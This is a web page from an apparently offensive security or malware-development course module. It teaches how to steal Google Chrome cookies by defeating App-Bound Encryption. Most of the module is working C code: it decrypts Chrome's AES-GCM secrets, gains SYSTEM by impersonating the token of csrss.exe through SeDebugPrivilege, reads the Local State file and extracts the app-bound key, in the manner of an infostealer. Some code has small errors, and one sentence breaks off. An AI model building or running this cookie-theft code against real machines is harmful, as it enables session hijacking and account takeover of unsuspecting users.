      <div id="height-container" class="flex h-full min-h-[800px]">
          <div class="flex max-w-full min-w-full">
              <div class="flex-1 min-w-0">
                  
                  <div id="description-container" class="viewer code-description h-full w-full bg-gray-800/70 backdrop-blur-md backdrop-saturate-150 p-4 px-5 md:px-10 lg:px-20 border border-t-0 border-gray-600/60 shadow-inner">

    
    <div id="module-skeleton" role="status" aria-live="polite" class="absolute inset-0 z-20 overflow-hidden bg-slate-900/70 ring-1 ring-white/10">
    <div class="h-full w-full max-w-5xl mx-auto py-8 animate-pulse motion-reduce:animate-none flex flex-col">

        
        <div class="flex flex-col items-center gap-3">
        <div class="h-7 w-72 rounded-xl bg-white/15"></div>
        <div class="h-px w-full bg-white/10"></div>
        </div>

        
        <div class="h-6 w-40 rounded-lg bg-white/12"></div>

        
        <div class="space-y-3 mb-6">
        <div class="h-4 w-full rounded-lg bg-white/10"></div>
        <div class="h-4 w-11/12 rounded-lg bg-white/10"></div>
        <div class="h-4 w-10/12 rounded-lg bg-white/10"></div>
        <div class="h-4 w-9/12  rounded-lg bg-white/10"></div>
        </div>

        
        <div class="h-56 md:h-72 lg:h-80 rounded-xl bg-white/5 ring-1 ring-white/10 flex items-center justify-center">
        <svg viewBox="0 0 64 64" aria-hidden="true" class="w-12 h-12 text-white/30" fill="none" stroke="currentColor" stroke-width="2">
            <rect x="8" y="14" width="48" height="36" rx="3" class="opacity-30"></rect>
            <circle cx="26" cy="28" r="5"></circle>
            <path d="M16 46l12-14 8 10 8-8 12 12"></path>
        </svg>
        </div>

        
        <div class="mt-6 flex-1 relative rounded-xl overflow-hidden">
        <div class="absolute inset-0 rounded-xl" style="
            background:
                linear-gradient(to right, transparent 0, transparent 8px, rgba(255,255,255,0.00) 8px, rgba(255,255,255,0.00) calc(100% - 8px), transparent 100%),
                repeating-linear-gradient(
                to bottom,
                rgba(255,255,255,0.10),                 /* line color */
                rgba(255,255,255,0.10) 12px,            /* line thickness */
                rgba(255,255,255,0.00) 12px,            /* gap start */
                rgba(255,255,255,0.00) 22px             /* gap height */
                );
            ">
        </div>
        </div>

    </div>
    </div>


    
    

    
    <div id="module-content" class="opacity-0 transition-opacity duration-300">
        <h2>Dumping Browser Cookies: Chrome</h2>
<h3>Introduction</h3>
<p>In the previous two modules we focused on Mozilla Firefox and showed 
how to retrieve sensitive data such as cookies and saved logins. This 
module shifts focus to Google Chrome, the most widely used browser. 
Well examine how Chrome stores user data and the protections it 
applies, and then develop a tool to export cookies and bookmarks similar
 to the one from the Firefox modules.</p>
<blockquote>
<p>This module uses Chrome 141.0.7390.54 Release (September 30, 2025).</p>
</blockquote>
<h3>Cookie Storage</h3>
<p>Like Firefox, Chrome stores cookies on disk using an SQLite database, located at <code>%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies</code>.
 Chrome encrypts sensitive data like cookies and saved logins using 
AES-256-GCM, and stores them in a structure we will refer to as a <em>Chrome secret</em>.
 A Chrome secret comprises both encrypted data and the metadata required
 to decrypt it. Therefore, in order to decrypt cookies, we must 
understand this structure.</p>
<p>A Chrome secret begins with a tag signifying the version of the secret. As of this module, the latest version is <code>v20</code>.
 This is followed by a 12-byte AES-GCM nonce, the encrypted data and a 
16-byte authentication tag. The AES-GCM cipher uses this tag to verify 
that the data has not been tampered with. We will refer to the AES-GCM 
key used for encryption as the <em>app-bound</em> key, which will be discussed more in-depth later in this module.</p>
<img src="81_files/ChromeSecret.png" style="margin:auto" width="1000px">
<br>
<h4>The PrintChromeSecret Function</h4>
<p>With this information fresh in mind, let us construct a function that
 decrypts a Chrome secret and prints it to the console. The <code>PrintChromeSecret</code> function does exactly that, and it takes in three parameters:</p>
<ul>
<li>
<p><code>AppBoundKey</code> - The AES-256-GCM key used when encrypting the data of the secret.</p>
</li>
<li>
<p><code>Data</code> - A buffer containing a Chrome secret.</p>
</li>
<li>
<p><code>DataSize</code> - The size of the <code>Data</code> buffer.</p>
</li>
</ul>
<p>First, we verify that the secret's version is <code>v20</code>, as 
expected. Next, we parse the structure to extract the AES-GCM tag and 
nonce. Then, we determine the size of the encrypted data by subtracting 
the size of the version header, the tag and the nonce from the total 
size of the secret. Finally, we use the <code>Aes256GcmDecrypt</code> helper function (explained later) to decrypt the data. We then print the data to the console with the <code>Cookie:</code> prefix, as this is the only type of secret we are interested in for this scenario.</p>
<pre><code class="language-C">CONST CHAR SecretVersion[] = { 'v', '2', '0' };

VOID PrintChromeSecret(_In_ PUCHAR AppBoundKey, _In_ PUCHAR Data, _In_ ULONG DataSize)
{
    PUCHAR Ciphertext;
    ULONG  CiphertextLength;
    PUCHAR Nonce; // The nonce is 12 bytes
    PUCHAR Tag;   // The tag is 16 bytes

    //
    // Validate the version
    //

    if (memcmp(Data, SecretVersion, sizeof(SecretVersion) != 0))
    {
        wprintf(L"Unsupported Chrome version\n");
        return;
    }

    //
    // Get the nonce
    //

    Nonce = Data + sizeof(SecretVersion);

    //
    // Get the authentication tag, which is the last 16 bytes
    //

    Tag = Data + DataSize - 16;

    //
    // The ciphertext is between the nonce and the tag
    //

    Ciphertext       = Data + sizeof(SecretVersion) + 12;
    CiphertextLength = DataSize - (sizeof(SecretVersion) + 12 + 16);

    //
    // Decrypt the ciphertext using AES-256-GCM with the app-bound key
    //

    if (Aes256GcmDecrypt(AppBoundKey, 32, Nonce, 12, Tag, 16, Ciphertext, CiphertextLength) == TRUE)
    {
		//
		// The value of the cookie starts after the first 32 bytes
		//

        wprintf(L"- Cookie: %.*hS\n\n", CiphertextLength - 32, Ciphertext + 32);
    }
}
</code></pre>
<br>
<h4>The Aes256GcmDecrypt Helper Function</h4>
<p>The <code>Aes256GcmDecrypt</code> function uses the BCrypt API to AES-256-GCM decrypt a memory buffer in place. It takes 8 parameters:</p>
<ul>
<li>
<p><code>Key</code>- The AES key to be used.</p>
</li>
<li>
<p><code>KeySize</code> - The size of the <code>Key</code> buffer.</p>
</li>
<li>
<p><code>Nonce</code>- The AES nonce to be used.</p>
</li>
<li>
<p><code>NonceSize</code>- The size of the nonce buffer.</p>
</li>
<li>
<p><code>Tag</code>- The authentication tag generated during encryption.
 It is used by the algorithm to verify that the ciphertext has not been 
altered and that the decrypted plaintext is authentic.</p>
</li>
<li>
<p><code>TagSize</code> - The size of the tag buffer.</p>
</li>
<li>
<p><code>Ciphertext</code> - The buffer which is to be decrypted.</p>
</li>
<li>
<p><code>CiphtertextSize</code> - The size of the <code>Ciphertext</code> buffer.</p>
</li>
</ul>
<p>First, the function uses <code>BCryptOpenAlgorithmProvider</code> to open a handle to the AES algorithm provider. The algorithm provider uses AES-CBC by default, so we must set it to GCM using <code>BCryptSetProperty</code> with the <code>BCRYPT_CHAIN_MODE_GCM</code> flag. Next, the AES key is imported into the function using <code>BCryptImportKey</code>. As AES-GCM is an authenticated cipher, the authentication mode must also be configured to use the given tag. Finally, we call <code>BCryptDecrypt</code> to decrypt the data in place.</p>
<pre><code class="language-C">BOOLEAN Aes256GcmDecrypt(_In_ PUCHAR Key, 
_In_ ULONG KeySize, _In_ PUCHAR Nonce, _In_ ULONG NonceSize, _In_ PUCHAR
 Tag, _In_ ULONG TagSize, _Inout_ PUCHAR Ciphertext, _Inout_ ULONG 
CiphertextLength)
{
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO CipherInfo;
    BCRYPT_ALG_HANDLE                     AlgorithmHandle;
    BCRYPT_KEY_HANDLE                     KeyHandle = 0;
    UCHAR                                 Buffer[AES_KEY_BLOB_SIZE];
    BCRYPT_KEY_DATA_BLOB_HEADER*          KeyBlob;
    ULONG                                 PlaintextSize;
    NTSTATUS                              Status;

    //
    // Open the AES algorithm provider
    //

    Status = BCryptOpenAlgorithmProvider(&amp;AlgorithmHandle, 
BCRYPT_AES_ALGORITHM, 0, 0);

    if (!BCRYPT_SUCCESS(Status))
    {
        wprintf(L"Could not open a handle on the AES algorithm provider:
 0x%08lX\n", Status);
        return FALSE;
    }

    do
    {
        //
        // Set it to GCM mode
        //

        Status = BCryptSetProperty(AlgorithmHandle, 
BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM, 
sizeof(BCRYPT_CHAIN_MODE_GCM), 0);

        if (!BCRYPT_SUCCESS(Status))
        {
            break;
        }

        //
        // Import the AES key
        //

        KeyBlob = (BCRYPT_KEY_DATA_BLOB_HEADER*)Buffer;
        KeyBlob-&gt;dwMagic = BCRYPT_KEY_DATA_BLOB_MAGIC;
        KeyBlob-&gt;dwVersion = 1;
        KeyBlob-&gt;cbKeyData = KeySize;

        RtlCopyMemory(Buffer + sizeof(BCRYPT_KEY_DATA_BLOB_HEADER), Key,
 KeySize);

        Status = BCryptImportKey(AlgorithmHandle, 0, 
BCRYPT_KEY_DATA_BLOB, &amp;KeyHandle, 0, 0, Buffer, sizeof(Buffer), 0);

        if (!BCRYPT_SUCCESS(Status))
        {
            wprintf(L"Could not import AES key: 0x%08lX\n", Status);
            break;
        }
		
		//
		// Configure the authentication mode
		// 
		
        BCRYPT_INIT_AUTH_MODE_INFO(CipherInfo);
        CipherInfo.pbNonce = Nonce;
        CipherInfo.cbNonce = NonceSize;
        CipherInfo.pbTag = Tag;
        CipherInfo.cbTag = TagSize;

        //
        // Decrypt the ciphertext
        //

        Status = BCryptDecrypt(KeyHandle, Ciphertext, CiphertextLength, 
&amp;CipherInfo, 0, 0, Ciphertext, CiphertextLength, 
&amp;CiphertextLength, 0);

        if (!BCRYPT_SUCCESS(Status))
        {
            wprintf(L"Could not decrypt the ciphertext: 0x%08lX\n", 
Status);
        }

    } while (FALSE);

    if (KeyHandle != 0)
    {
        BCryptDestroyKey(KeyHandle);
    }

    BCryptCloseAlgorithmProvider(AlgorithmHandle, 0);
    return BCRYPT_SUCCESS(Status);
}
</code></pre>
<p>Now that we know where Chrome stores secrets and how they are 
protected, the only other information needed to decrypt Chrome's cookies
 is the app-bound key. This key is stored in the <code>%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Local State</code> JSON file, and it's encrypted using Chrome's <em>Application-Bound Encryption</em> mechanism.</p>
<h3>Application-Bound Encryption</h3>
<p>Before version 127, Chrome secured the app-bound key using the <em>Data Protection API</em>
 (DPAPI). The DPAPI is a collection of functions that provide 
operating-system-level data protection services to applications. Its 
purpose is to let applications protect data without needing to implement
 their own cryptographic code. Chrome used the <a href="https://learn.microsoft.com/en-us/windows/win32/api/dpapi/nf-dpapi-cryptprotectdata">CryptProtectData</a> function from DPAPI to encrypt the app-bound key before storing it in the <code>Local State</code> file.</p>
<p>Data encrypted this way can only be decrypted by the same user using the <a href="https://learn.microsoft.com/en-us/windows/win32/api/dpapi/nf-dpapi-cryptunprotectdata">CryptUnprotectData</a>
 function. Therefore, to decrypt the app-bound key you must be running 
as the same user who ran Chrome. Usually this was not a problem because 
our malware ran under the same user account that uses Chrome. In the 
rare cases when it did not, we could impersonate the access token of the
 <code>chrome.exe</code> process.</p>
<p>However, because this protection was easy for information stealers 
(also known as infostealers) to bypass, Google enhanced the security of 
the app-bound key in Chrome version 127 by implementing 
Application-Bound Encryption. Now, instead of being linked to the user, 
the encrypted data is bound to the Chrome application itself. This means
 that, in theory, only the Chrome executable located at <code>C:\Program Files\Google\Chrome\Application\</code> can decrypt and access the app-bound key. At this point, two possibilities of accessing the app-bound key may come to mind:</p>
<ol>
<li>
<p>Performing remote process injection into <code>chrome.exe</code>.</p>
</li>
<li>
<p>Writing a binary in the <code>C:\Program Files\Google\Chrome\Application\</code> folder and running it.</p>
</li>
</ol>
<p>These are the approaches that the Google security team intended to 
coerce malware authors into. Indeed, the purpose of application-bound 
encryption is not to prevent the app-bound key from being accessed by 
malware but rather to make the process as noisy as possible, in the hope
 of triggering a response from anti-malware solutions. In the first 
scenario, remote process injection is performed, which is heavily 
monitored and scrutinized. The other scenario requires admin privileges 
and involves writing a binary to disk.</p>
<h4>Chrome Elevation Service</h4>
<p>In Chrome, app-bound encryption depends on a privileged service called the <em>Chrome Elevation Service</em>, which runs in the context of the <code>NT AUTHORITY\SYSTEM</code>
 account. This Elevation Service hosts an RPC server that handles the 
encryption and decryption of the app-bound key on behalf of Chrome. When
 Chrome needs to decrypt the app-bound key, it must make an RPC call to 
this service. However, as mentioned above, the elevation service 
validates the identity of the RPC client and only permits Google Chrome 
to perform this action. Since Google Chrome is based on the Chromium 
browser, which is open-source, we can examine the part of the elevation 
service's source code that handles caller validation.</p>
<p>Caller validation is performed by the <code>ValidatePath</code> function. First, it retrieves the full name of the caller's process using the <code>GetProcessExecutablePath</code> function, which calls the <code>QueryFullProcessImageNameW</code> WinAPI. It then calls its own <code>GeneratePathValidationData</code> function, which uses the helper function <code>MaybeTrimProcessPath</code>
 to trim the EXE part from the process path. The trimmed path is then 
matched against the Chrome installation directory. Examining this source
 code helps us to understand why the two possible workarounds discussed 
above work.</p>
<pre><code class="language-C">//
// Source: 
https://github.com/chromium/chromium/
blob/225f82f8025e4f93981310fd33daa71dc972bfa9/chrome/elevation_service/
caller_validation.cc
//

// Paths look like this: "C:\Program Files\Blah\app.exe".
// This function will remove the final EXE, then it will remove paths 
that match
// 'Temp', 'Application' or a version pattern if they are the final 
directory.
//
// Examples:
// "C:\Program Files\Blah\app.exe" -&gt;
// "C:\Program Files\Blah"
//
// "C:\Program Files\Blah\app2.exe" -&gt;
// "C:\Program Files\Blah"
//
// "C:\Program Files\Blah\Temp\app.exe" -&gt;
// "C:\Program Files\Blah"
//
// "C:\Program Files\Blah\Application\app.exe" -&gt;
// "C:\Program Files\Blah"
//
// "C:\Program Files (x86)\Blah\Application\app.exe" -&gt;
// "C:\Program Files\Blah"
//
// "C:\Program Files (x86)\Blah\Application\1.2.3.4\app.exe" -&gt;
// "C:\Program Files\Blah"
//
base::FilePath MaybeTrimProcessPath(const base::FilePath&amp; full_path)
 {
  auto components = full_path.GetComponents();
  std::vector&lt;std::wstring&gt; trimmed_components;

  size_t token = 0;
  for (auto it = components.crbegin(); it != components.crend(); ++it) {
    token++;
    if (token == 1 &amp;&amp;
        base::EndsWith(*it, L".exe", 
base::CompareCase::INSENSITIVE_ASCII)) {
      continue;
    }
    if (token == 2 &amp;&amp; (base::EqualsCaseInsensitiveASCII(*it, 
"Temp") ||
                       base::EqualsCaseInsensitiveASCII(*it, 
"Application"))) {
      continue;
    }
    if (token == 2 &amp;&amp; it-&gt;starts_with(L"scoped_dir")) {
      token--;
      continue;
    }
    if (token == 2 &amp;&amp; 
base::Version(base::WideToASCII(it-&gt;data())).IsValid()) {
      token--;
      continue;
    }

    if (base::EqualsCaseInsensitiveASCII(*it, L"Program Files (x86)")) {
      trimmed_components.push_back(L"Program Files");
      continue;
    }
    trimmed_components.push_back(*it);
  }
  base::FilePath trimmed_path;
  for (auto it = trimmed_components.crbegin(); it != 
trimmed_components.crend();
       ++it) {
    trimmed_path = trimmed_path.Append(*it);
  }
  return trimmed_path;
}

// Generate path based validation data, or return empty string if this 
was not
// possible.
base::expected&lt;std::vector&lt;uint8_t&gt;, HRESULT&gt; 
GeneratePathValidationData(
    const base::FilePath&amp; process_path) {
  if (process_path.IsNetwork()) {
    return base::unexpected(
        elevation_service::Elevator::kErrorUnsupportedFilePath);
  }
  // Wide to narrow data loss is fine here, because the same system will
 always
  // be dealing with the same data.
  const auto narrow_path =
      base::SysWideToUTF8(MaybeTrimProcessPath(process_path).value());
  return std::vector&lt;uint8_t&gt;(narrow_path.begin(), 
narrow_path.end());
}

base::expected&lt;base::FilePath, DWORD&gt; GetProcessExecutablePath(
    const base::Process&amp; process) {
  std::wstring image_path(MAX_PATH, L'\0');
  DWORD path_length = image_path.size();
  BOOL success = ::QueryFullProcessImageNameW(process.Handle(), 0,
                                              image_path.data(), 
&amp;path_length);
  if (!success &amp;&amp; ::GetLastError() == ERROR_INSUFFICIENT_BUFFER)
 {
    // Process name is potentially greater than MAX_PATH, try larger max
 size.
    // 
https://docs.microsoft.com/en-us/windows/win32/fileio/maximum-file-path-
limitation
    image_path.resize(UNICODE_STRING_MAX_CHARS);
    path_length = image_path.size();
    success = ::QueryFullProcessImageNameW(process.Handle(), 0,
                                           image_path.data(), 
&amp;path_length);
  }
  if (!success) {
    PLOG_IF(ERROR, ::GetLastError() != ERROR_GEN_FAILURE)
        &lt;&lt; "Failed to get process image path";
    return base::unexpected(::GetLastError());
  }
  return base::FilePath(image_path);
}

// Generate path based validation data, or return empty string if this 
was not
// possible.
base::expected&lt;std::vector&lt;uint8_t&gt;, HRESULT&gt; 
GeneratePathValidationData(
    const base::FilePath&amp; process_path) {
  if (process_path.IsNetwork()) {
    return base::unexpected(
        elevation_service::Elevator::kErrorUnsupportedFilePath);
  }
  // Wide to narrow data loss is fine here, because the same system will
 always
  // be dealing with the same data.
  const auto narrow_path =
      base::SysWideToUTF8(MaybeTrimProcessPath(process_path).value());
  return std::vector&lt;uint8_t&gt;(narrow_path.begin(), 
narrow_path.end());
}

HRESULT ValidatePath(const base::Process&amp; process,
                     base::span&lt;const uint8_t&gt; data,
                     std::string* log_message) {
  const auto process_path = GetProcessExecutablePath(process);
  if (!process_path.has_value()) {
    return elevation_service::Elevator::kErrorCouldNotObtainPath;
  }

  auto current_path_data = GeneratePathValidationData(*process_path);
  if (!current_path_data.has_value()) {
    return current_path_data.error();
  }

  if (data.size() == current_path_data-&gt;size() &amp;&amp;
      std::equal(data.begin(), data.end(), 
current_path_data-&gt;cbegin())) {
    return S_OK;
  }

  SYSLOG(WARNING) &lt;&lt; "Failed to authenticate caller process: "
                  &lt;&lt; process_path-&gt;value();

  if (log_message) {
    *log_message =
        "Data: '" + std::string(data.begin(), data.end()) + "'. Current:
 '" +
        std::string(current_path_data-&gt;cbegin(), 
current_path_data-&gt;cend()) +
        "'";
  }

  return elevation_service::Elevator::kValidationDidNotPass;
}
</code></pre>
<p>After the caller is validated, the service calls its internal <code>DecryptData</code>
 function to decrypt the app-bound key. Given that we have access to the
 source code for Chromium, if we manage to gain execution in the context
 of <code>SYSTEM</code>, we can simply replicate <a href="https://github.com/chromium/chromium/blob/225f82f8025e4f93981310fd33daa71dc972bfa9/chrome/elevation_service/elevator.cc#L155">the steps</a> the elevation service takes to decrypt the app-bound key. As getting <code>SYSTEM</code> is not uncommon in a red team engagement, this is the approach we will take in this module.</p>
<h3>Mimicking The Elevation Service</h3>
<p>As explained, we must first gain the ability to operate as the <code>SYSTEM</code> user. We will enforce that our tool runs as a local administrator so that we can leverage the <code>SeDebugPrivilege</code> privilege to open a handle to the token of a system process. We can then impersonate this token whenever we need to run as <code>SYSTEM</code>.</p>
<p>The <code>GetSystemToken</code> helper uses <code>RtlAcquirePrivilege</code> to gain the <code>SeDebugPrivilege</code> privilege which allows us to bypass access checks related to process operations. Then, we will use another helper, <code>OpenProcessTokenByName</code>, to open a handle to the <code>csrss.exe</code> system process, since it is always present. <code>OpenProcessTokenByName</code> will be explained shortly.</p>
<pre><code class="language-C">HANDLE GetSystemToken()
{
    NTSTATUS Status;
    ULONG    Privilege = SE_DEBUG_PRIVILEGE;
    PVOID    State;

    //
    // Get the SeDebugPrivilege privilege
    //

    Status = RtlAcquirePrivilege(&amp;Privilege, 1, 0, &amp;State);

    if (!NT_SUCCESS(Status))
    {
        wprintf(L"Could not acquire the SeDebugPrivilege: 0x%08lX\n", Status);
        return FALSE;
    }

    return OpenProcessTokenByName(L"csrss.exe");
}
</code></pre>
<p>The <code>OpenProcessTokenByName</code> function opens an access token for a process by its name. It first finds the process ID (PID) of the target process using the <code>GetProcessPid</code> function. <code>GetProcessPid</code> takes a snapshot of all running processes with <code>CreateToolhelp32Snapshot</code> and scans through them until it finds the specified process, returning its PID. Using this PID, <code>OpenProcessTokenByName</code> calls <code>OpenProcess</code> to get a handle to the process with <code>PROCESS_QUERY_LIMITED_INFORMATION</code> rights. With this handle, it then uses <code>OpenProcessToken</code> to open a handle to the process's access token, which it returns if successful. This token can then be impersonated using <code>ImpersonateLoggedOnUser</code>.</p>
<pre><code class="language-C">ULONG GetProcessPid(_In_ LPCWSTR ProcessName)
{
    HANDLE         Snapshot;
    ULONG          ProcessId = 0;
    PROCESSENTRY32 Entry;

    //
    // Take a snapshot of all processes in the system
    //

    Snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (Snapshot == INVALID_HANDLE_VALUE)
    {
        return 0;
    }

    Entry.dwSize = sizeof(PROCESSENTRY32);
    
    //
    // Get information about the first process in the snapshot
    //

    if (Process32First(Snapshot, &amp;Entry) == FALSE)
    {
        CloseHandle(Snapshot);
        return 0;
    }

    //
    // Iterate each entry looking for the specified process
    //

    do
    {
        if (wcscmp(Entry.szExeFile, ProcessName) == 0)
        {
            ProcessId = Entry.th32ProcessID;
            break;
        }

    } while (Process32Next(Snapshot, &amp;Entry));

    //
    // Close the handle to the snapshot
    //

    CloseHandle(Snapshot);
    return ProcessId;
}

HANDLE OpenProcessTokenByName(_In_ LPCWSTR ProcessName)
{
    ULONG  ProcessId;
    HANDLE ProcessHandle;
    HANDLE TokenHandle = 0;

    //
    // Get the PID of the specified process as it is required by the OpenProcess WinAPI
    //

    ProcessId = GetProcessPid(ProcessName);

    if (ProcessId == 0)
    {
        wprintf(L"Could not get the PID of: %ws\n", ProcessName);
        return 0;
    }

    //
    // Open a handle to the process with PROCESS_QUERY_LIMITED_INFORMATION access permission so we can get a handle to its token
    //

    ProcessHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, ProcessId);

    if (ProcessHandle == INVALID_HANDLE_VALUE)
    {
        wprintf(L"Could not open a handle to: %lu error: %lu\n", ProcessId, GetLastError());
        return 0;
    }

    //
    // Open a handle to the process's token with TOKEN_QUERY | TOKEN_DUPLICATE access permission so we can impersonate it
    //

    if (OpenProcessToken(ProcessHandle, TOKEN_QUERY | TOKEN_DUPLICATE, &amp;TokenHandle) == FALSE)
    {
        wprintf(L"Could not open a handle to the token of: %lu error: %lu\n", ProcessId, GetLastError());
    }

    CloseHandle(ProcessHandle);
    return TokenHandle;
}
</code></pre>
<br>
<h4>The Decryption Process</h4>
<p>Now that we can run as the <code>SYSTEM</code> user when needed, we 
can begin the decryption process. First, we need to read the local state
 file, as it contains the encrypted app-bound key. To do this, we use 
the <a href="https://learn.microsoft.com/en-us/windows/win32/api/shlobj_core/nf-shlobj_core-shgetknownfolderpath">SHGetKnownFolderPath</a> function to get the path to the <code>AppData\Local</code> folder. We then set this path as the current working directory with the <a href="https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-setcurrentdirectory">SetCurrentDirectoryW</a> WinAPI function. This allows us to reference Chrome's user data folder via a relative path starting from <code>AppData\Local</code>. Next, we read the local state JSON file located at <code>Google\Chrome\User Data\Local State</code> using the <code>ReadFileContents</code> helper function. Finally, we call <code>ExtractAppBoundKey</code>
 to extract and decrypt the app-bound key from the local state file. The
 details of the key extraction function will be explained shortly.</p>
<pre><code class="language-C">PUCHAR ReadFileContents(_In_ PWCHAR 
FileName, _Inout_ PULONG Size)
{
    HANDLE FileHandle;
    ULONG  FileSize;
    ULONG  BytesRead;
    BOOL   Result;
    PUCHAR Buffer = 0;

    FileHandle = CreateFileW(FileName, GENERIC_READ, FILE_SHARE_READ | 
FILE_SHARE_WRITE, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);

    if (FileHandle == INVALID_HANDLE_VALUE)
    {
        wprintf(L"Could not open a handle on the: %ws file: %lu\n", 
FileName, GetLastError());
        return 0;
    }

    do
    {
        FileSize = GetFileSize(FileHandle, 0);

        if (FileSize == 0)
        {
            wprintf(L"Could get the size of the: %ws file: %lu\n", 
FileName, GetLastError());
            break;
        }

        Buffer = (PUCHAR)HeapAlloc(GetProcessHeap(), 0, FileSize);

        if (Buffer == 0)
        {
            wprintf(L"Could not allocate the %lu bytes needed to read 
the contents of: %ws\n", FileSize, FileName);
            break;
        }

        Result = ReadFile(FileHandle, Buffer, FileSize, &amp;BytesRead, 
0);

        if (Result == FALSE || BytesRead != FileSize)
        {
            wprintf(L"Could read the: %ws file: %lu\n", FileName, 
GetLastError());
            HeapFree(GetProcessHeap(), 0, Buffer);
            Buffer = 0;
        }
        else if (Size != 0)
        {
            *Size = FileSize;
        }
    } while (FALSE);

    CloseHandle(FileHandle);
    return Buffer;
}

INT main()
{
    //
    // Get the path to the AppData\Local folder
    //

    HRESULT Result;
    PWSTR   AppDataPath;
    PUCHAR  LocalState;
    UCHAR   AppBoundKey[32];

    Result = SHGetKnownFolderPath(FOLDERID_LocalAppData, 
KF_FLAG_DONT_UNEXPAND, 0, &amp;AppDataPath);

    if (FAILED(Result))
    {
        wprintf(L"Could not get the path of the AppData folder: %lu\n", 
Result);
        return -1;
    }

    //
    // Set it as the current working directory
    //

    SetCurrentDirectoryW(AppDataPath);
    CoTaskMemFree(AppDataPath);        // Free the memory allocated by 
SHGetKnownFolderPath

    //
    // Get the app-bound encryption key
    //

    LocalState = ReadFileContents((PWCHAR)L"Google\\Chrome\\User 
Data\\Local State", 0);

    if (LocalState == 0)
    {
        return -1;
    }

    Result = ExtractAppBoundKey((PSTR)LocalState, AppBoundKey);
    HeapFree(GetProcessHeap(), 0, LocalState);

    if (Result == FALSE)
    {
        return -1;
    }
	
	//
	// SNIP ---------------------
	//

}
</code></pre>
<br>
<h4>The ExtractAppBoundKey Function</h4>
<p>The <code>ExtractAppBoundKey</code> function is responsible for 
extracting the encrypted app-bound key from the local state JSON file 
and decrypting it. It takes two parameters:</p>
<ul>
<li>
<p><code>LocalState</code> - The contents of the local state JSON file.</p>
</li>
<li>
<p><code>DecryptedKey</code> - A buffer that will receive the decrypted app-bound key.</p>
</li>
</ul>
<p>The function begins by using <code>strstr</code> to locate the <code>app_bound_encrypted_key</code>
 attribute in the JSON. This attributes value is a structure that 
describes the encrypted app-bound key, which we will call the <em>key descriptor</em>. Because this value is base-64 encoded, we need to decode it first using the <code>Base64Decode</code> helper from the Firefox modules. Before moving forward, lets take a closer look at the format of the key descriptor:</p>
<img src="81_files/AppBoundKey.png" style="margin:auto" width="1000px">
<p>The descriptor begins with an <code>APPB</code> header, which is followed by verification data. Because everything after the header is encrypted,</p>
<p>This verification data contains the path to the Chrome installation and is required because everything after the <code>APPB</code>
 header is encrypted using a method we will explain soon. After the 
verification data, there is an AES-256-GCM key, tag and nonce which were
 used to encrypt the app-bound key found between the nonce and the tag.</p>
<p>With this in mind, we skip the <code>APPB</code> header and call <code>DecryptAppBoundKey</code> to decrypt the key descriptor. The function will use the decrypted key descriptor to decrypt the app-bound key itself.</p>
<pre><code class="language-C">PUCHAR Base64Decode(_In_ PSTR 
EncodedBuffer, _In_ ULONG EncodedBufferSize, _Inout_ PULONG 
DecodedBufferSize)
{
    PUCHAR  DecodedBuffer;
    BOOLEAN Result;
    
    Result = CryptStringToBinaryA(EncodedBuffer, EncodedBufferSize, 
CRYPT_STRING_BASE64, 0, DecodedBufferSize, 0, 0);

    if (Result == FALSE)
    {
        wprintf(L"Could not calculate the size of the base64 decoded 
AppBound key: 0x%08lX\n", GetLastError());
        return 0;
    }

    DecodedBuffer = (PUCHAR)HeapAlloc(GetProcessHeap(), 0, 
*DecodedBufferSize);

    if (DecodedBuffer == 0)
    {
        return 0;
    }

    Result = CryptStringToBinaryA(EncodedBuffer, EncodedBufferSize, 
CRYPT_STRING_BASE64, DecodedBuffer, DecodedBufferSize, 0, 0);

    if (Result == FALSE)
    {
        wprintf(L"Could not base64 decode the AppBound key: 0x%08lX\n", 
GetLastError());
        HeapFree(GetProcessHeap(), 0, DecodedBuffer);
        return 0;
    }

    return DecodedBuffer;
}

CONST CHAR kCryptAppBoundKeyPrefix[] = { 'A', 'P', 'P', 'B' };

BOOLEAN ExtractAppBoundKey(_In_ PSTR LocalState, _Out_ PUCHAR 
DecryptedKey)
{
    PSTR    AppBoundKey;
    BOOLEAN Result;
    PUCHAR  DecodedKey;
    ULONG   KeySize;

    //
    // Look for "app_bound_encrypted_key" property in the JSON
    //

    AppBoundKey = strstr(LocalState, "app_bound_encrypted_key");

    if (AppBoundKey == 0)
    {
        wprintf(L"Could not find the AppBound key in the local state 
file\n");
        return FALSE;
    }

    //
    // Skip over the "app_bound_encrypted_key:" to get the base64 
encoded key
    //

    AppBoundKey += sizeof("\"app_bound_encrypted_key\"");
    KeySize = strchr(AppBoundKey, '"') - AppBoundKey;

    //
    // Base64 decode the key
    //

    DecodedKey = Base64Decode(AppBoundKey, KeySize, &amp;KeySize);

    if (DecodedKey == 0)
    {
        return FALSE;
    }

    //
    // Decrypt the key
    //

    Result = DecryptAppBoundKey(DecodedKey + 
sizeof(kCryptAppBoundKeyPrefix), KeySize - 
sizeof(kCryptAppBoundKeyPrefix), DecryptedKey); // Skip over the key's 
header ("APPB")
    HeapFree(GetProcessHeap(), 0, DecodedKey);

    return Result;
}
</code></pre>
<br>
<h4>The DecryptAppBoundKey Function</h4>
<p><code>DecryptAppBoundKey</code> is the function we use to decrypt the
 key descriptor, and in turn the app-bound key itself. It encapsulates 
the process performed by the Chrome Elevation Service. It takes in three
 parameters:</p>
<ul>
<li><code>AppBoundKey</code> - The key descriptor.</li>
<li><code>AppBoundKeySize</code> - The size of the key descriptor.</li>
<li><code>DecryptedKey</code> - A buffer which will receive the decrypted app-bound key.</li>
</ul>
<p>First, it obtains a handle to the token of a system process using the previously created <code>GetSystemToken</code> helper. Using this token, it impersonates the <code>SYSTEM</code> user and calls <code>CryptUnprotectData</code> on the key descriptor, removing the first layer of encryption. Recall that data encrypted using <code>CryptProtectData</code> is tied to the user who encrypted it. This is one of the reasons why we need to run as the <code>SYSTEM</code> user in order to mimic the decryption process.</p>
